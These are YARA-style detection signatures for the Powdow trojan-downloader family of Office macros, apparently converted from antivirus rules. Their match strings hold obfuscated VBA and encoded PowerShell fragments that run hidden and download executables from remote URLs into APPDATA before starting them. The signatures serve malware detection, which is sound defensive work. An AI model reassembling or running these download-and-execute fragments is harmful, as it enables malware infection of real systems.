
rule TrojanDownloader_O97M_Powdow_VA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.VA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {73 20 3d 20 73 20 2b 20 22 2f 4d 49 22 20 2b 20 22 4e 20 43 3a 5c 57 69 22 20 2b 20 22 6e 64 6f 22 } //1 s = s + "/MI" + "N C:\Wi" + "ndo"
		$a_01_1 = {73 20 3d 20 73 20 2b 20 22 77 73 5c 53 79 73 22 20 2b 20 22 74 65 6d 33 32 5c 22 20 2b 20 22 57 69 6e 64 22 20 2b 20 22 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 22 } //1 s = s + "ws\Sys" + "tem32\" + "Wind" + "owsPo" + "wer"
		$a_01_2 = {73 20 3d 20 73 20 2b 20 22 53 68 65 22 20 2b 20 22 6c 6c 5c 76 31 2e 30 22 20 2b 20 22 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 22 20 2b 20 22 65 6c 6c 2e 22 20 2b 20 22 65 78 65 22 } //1 s = s + "She" + "ll\v1.0" + "\pow" + "ersh" + "ell." + "exe"
		$a_01_3 = {73 20 3d 20 73 20 2b 20 22 20 2d 77 69 6e 20 22 20 2b 20 22 31 20 2d 65 22 20 2b 20 22 6e 63 20 22 } //1 s = s + " -win " + "1 -e" + "nc "
		$a_01_4 = {73 20 3d 20 73 20 2b 20 22 4a 41 42 51 41 48 49 41 62 77 } //1 s = s + "JABQAHIAbw
		$a_01_5 = {53 68 65 6c 6c 28 62 61 74 2c 20 30 29 } //1 Shell(bat, 0)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_Powdow_VA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.VA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {36 43 36 39 36 33 37 39 32 30 36 32 37 39 37 30 36 31 37 33 37 33 32 30 32 44 35 37 32 30 34 38 36 39 36 34 36 34 36 35 36 45 32 30 32 44 36 33 36 46 36 44 36 44 36 31 36 45 36 34 32 30 32 38 36 45 36 35 37 37 32 44 36 46 36 32 36 41 36 35 36 33 37 34 32 30 35 33 37 39 37 33 37 34 36 35 36 44 32 45 34 45 36 35 37 34 32 45 35 37 36 35 36 32 34 33 36 43 36 39 36 35 36 45 37 34 32 39 32 45 34 34 36 46 37 37 36 45 36 43 36 46 36 31 36 34 34 36 36 39 36 43 36 35 32 38 32 37 36 38 37 34 37 34 37 30 33 41 32 46 32 46 37 33 36 35 37 36 32 45 36 44 36 39 36 43 36 35 36 45 36 32 36 31 37 41 36 39 36 45 37 33 36 42 36 39 32 45 36 44 36 35 33 41 33 32 33 30 33 39 33 35 32 46 37 30 37 33 32 46 36 43 } //1 6C69637920627970617373202D572048696464656E202D636F6D6D616E6420286E65772D6F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F7365762E6D696C656E62617A696E736B692E6D653A323039352F70732F6C
		$a_01_1 = {73 53 74 72 20 2b 20 43 68 72 28 43 4c 6e 67 28 22 26 48 22 20 26 20 4d 69 64 28 73 74 72 2c 20 69 2c 20 32 29 29 29 } //1 sStr + Chr(CLng("&H" & Mid(str, i, 2)))
		$a_01_2 = {43 68 72 45 6e 63 6f 64 65 20 3d 20 73 53 74 72 } //1 ChrEncode = sStr
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_VA_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Powdow.VA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,14 00 14 00 14 00 00 "
		
	strings :
		$a_01_0 = {77 73 5c 53 79 73 74 65 6d 33 32 5c 22 20 2b 20 22 57 69 6e 64 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 65 6c 6c 2e 65 78 65 22 } //1 ws\System32\" + "WindowsPo" + "werShell\v1.0\pow" + "ershell.exe"
		$a_01_1 = {22 20 2d 77 69 6e 20 31 20 2d 65 6e 63 22 } //1 " -win 1 -enc"
		$a_01_2 = {53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 } //1 Shell(batch, 0)
		$a_01_3 = {2b 20 22 4c 67 42 7a 41 47 67 41 4c 77 42 6e 41 47 55 22 } //1 + "LgBzAGgALwBnAGU"
		$a_01_4 = {2b 20 22 41 64 41 41 76 41 45 67 41 65 51 42 4c 41 48 22 } //1 + "AdAAvAEgAeQBLAH"
		$a_01_5 = {2b 20 22 6b 41 62 51 42 32 41 43 38 41 64 77 42 76 41 22 } //1 + "kAbQB2AC8AdwBvA"
		$a_01_6 = {2b 20 22 48 49 41 5a 41 42 68 41 48 49 41 64 41 41 75 22 } //1 + "HIAZABhAHIAdAAu"
		$a_01_7 = {2b 20 22 41 47 55 41 65 41 42 6c 41 43 49 41 4c 41 41 22 } //1 + "AGUAeABlACIALAA"
		$a_01_8 = {2b 20 22 69 41 43 51 41 5a 51 42 75 41 48 59 41 4f 67 22 } //1 + "iACQAZQBuAHYAOg"
		$a_01_9 = {2b 20 22 42 42 41 46 41 41 55 41 42 45 41 45 45 41 56 22 } //1 + "BBAFAAUABEAEEAV"
		$a_01_10 = {2b 20 22 41 42 42 41 46 77 41 4a 41 42 51 41 48 49 41 22 } //1 + "ABBAFwAJABQAHIA"
		$a_01_11 = {2b 20 22 62 77 42 6a 41 45 34 41 59 51 42 74 41 47 55 22 } //1 + "bwBjAE4AYQBtAGU"
		$a_01_12 = {2b 20 22 41 49 67 41 70 41 44 73 41 55 77 42 30 41 47 22 } //1 + "AIgApADsAUwB0AG"
		$a_01_13 = {2b 20 22 45 41 63 67 42 30 41 43 30 41 55 41 42 79 41 22 } //1 + "EAcgB0AC0AUAByA"
		$a_01_14 = {2b 20 22 47 38 41 59 77 42 6c 41 48 4d 41 63 77 41 67 22 } //1 + "G8AYwBlAHMAcwAg"
		$a_01_15 = {2b 20 22 41 43 67 41 49 67 41 6b 41 47 55 41 62 67 42 22 } //1 + "ACgAIgAkAGUAbgB"
		$a_01_16 = {2b 20 22 32 41 44 6f 41 51 51 42 51 41 46 41 41 52 41 22 } //1 + "2ADoAQQBQAFAARA"
		$a_01_17 = {2b 20 22 42 42 41 46 51 41 51 51 42 63 41 43 51 41 55 22 } //1 + "BBAFQAQQBcACQAU"
		$a_01_18 = {2b 20 22 41 42 79 41 47 38 41 59 77 42 4f 41 47 45 41 22 } //1 + "AByAG8AYwBOAGEA"
		$a_01_19 = {2b 20 22 62 51 42 6c 41 43 49 41 4b 51 41 3d 22 } //1 + "bQBlACIAKQA="
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_01_10  & 1)*1+(#a_01_11  & 1)*1+(#a_01_12  & 1)*1+(#a_01_13  & 1)*1+(#a_01_14  & 1)*1+(#a_01_15  & 1)*1+(#a_01_16  & 1)*1+(#a_01_17  & 1)*1+(#a_01_18  & 1)*1+(#a_01_19  & 1)*1) >=20
 
}
rule TrojanDownloader_O97M_Powdow_VA_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Powdow.VA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,09 00 09 00 09 00 00 "
		
	strings :
		$a_01_0 = {22 20 63 6e 65 2d 20 31 20 6e 69 77 2d 20 65 78 65 2e 6c 6c 65 68 73 72 65 77 6f 70 5c 30 2e 31 22 } //1 " cne- 1 niw- exe.llehsrewop\0.1"
		$a_01_1 = {73 20 2b 20 22 76 5c 6c 6c 65 68 53 72 65 77 6f 50 73 77 6f 64 6e 69 57 5c 32 33 6d 65 74 73 79 53 5c 73 77 6f 64 6e 69 57 5c 3a 43 } //1 s + "v\llehSrewoPswodniW\23metsyS\swodniW\:C
		$a_01_2 = {53 68 65 6c 6c 28 62 61 74 2c 20 30 29 } //1 Shell(bat, 0)
		$a_01_3 = {2b 20 22 4a 41 42 51 41 48 49 41 62 77 42 6a 41 45 34 41 59 51 42 74 41 47 55 41 49 41 41 39 41 43 41 41 49 67 42 59 41 48 51 41 59 77 42 70 41 47 4d 41 5a 77 42 72 41 48 67 41 65 67 42 69 41 47 30 41 61 77 42 32 41 47 73 41 59 77 42 75 41 48 63 41 5a 41 42 33 41 48 59 41 5a 51 42 70 41 48 6f 41 65 } //1 + "JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBYAHQAYwBpAGMAZwBrAHgAegBiAG0AawB2AGsAYwBuAHcAZAB3AHYAZQBpAHoAe
		$a_01_4 = {2b 20 22 41 41 75 41 47 55 41 65 41 42 6c 41 43 49 41 4f 77 41 6f 41 45 34 41 5a 51 42 33 41 43 30 41 54 77 42 69 41 47 6f 41 5a 51 42 6a 41 48 51 41 49 41 42 54 41 48 6b 41 63 77 42 30 41 47 55 41 62 51 41 75 41 45 34 41 5a 51 42 30 41 43 34 41 56 77 42 6c 41 47 49 41 51 77 42 73 41 47 6b 41 5a 51 } //1 + "AAuAGUAeABlACIAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQ
		$a_01_5 = {2b 20 22 42 75 41 48 51 41 4b 51 41 75 41 45 51 41 62 77 42 33 41 47 34 41 62 41 42 76 41 47 45 41 5a 41 42 47 41 47 6b 41 62 41 42 6c 41 43 67 41 49 67 42 6f 41 48 51 41 64 41 42 77 41 48 4d 41 4f 67 41 76 41 43 38 41 64 77 42 33 41 48 63 41 4c 67 42 6c 41 48 67 41 64 41 42 79 41 47 45 41 62 51 42 } //1 + "BuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBlAHgAdAByAGEAbQB
		$a_01_6 = {2b 20 22 70 41 47 77 41 5a 51 42 77 41 47 38 41 62 41 42 70 41 47 4d 41 65 51 41 75 41 48 4d 41 61 51 42 30 41 47 55 41 4c 77 42 30 41 48 49 41 61 51 42 68 41 47 77 41 5a 51 42 79 41 48 49 41 62 77 42 79 41 43 34 41 5a 51 42 34 41 47 55 41 49 67 41 73 41 43 49 41 4a 41 42 6c 41 47 34 41 64 67 41 36 } //1 + "pAGwAZQBwAG8AbABpAGMAeQAuAHMAaQB0AGUALwB0AHIAaQBhAGwAZQByAHIAbwByAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6
		$a_01_7 = {2b 20 22 41 45 45 41 55 41 42 51 41 45 51 41 51 51 42 55 41 45 45 41 58 41 41 6b 41 46 41 41 63 67 42 76 41 47 4d 41 54 67 42 68 41 47 30 41 5a 51 41 69 41 43 6b 41 4f 77 42 54 41 48 51 41 59 51 42 79 41 48 51 41 4c 51 42 51 41 48 49 41 62 77 42 6a 41 47 55 41 63 77 42 7a 41 43 41 41 4b 41 41 69 41 } //1 + "AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiA
		$a_01_8 = {2b 20 22 43 51 41 5a 51 42 75 41 48 59 41 4f 67 42 42 41 46 41 41 55 41 42 45 41 45 45 41 56 41 42 42 41 46 77 41 4a 41 42 51 41 48 49 41 62 77 42 6a 41 45 34 41 59 51 42 74 41 47 55 41 49 67 41 70 41 41 3d 3d } //1 + "CQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1) >=9
 
}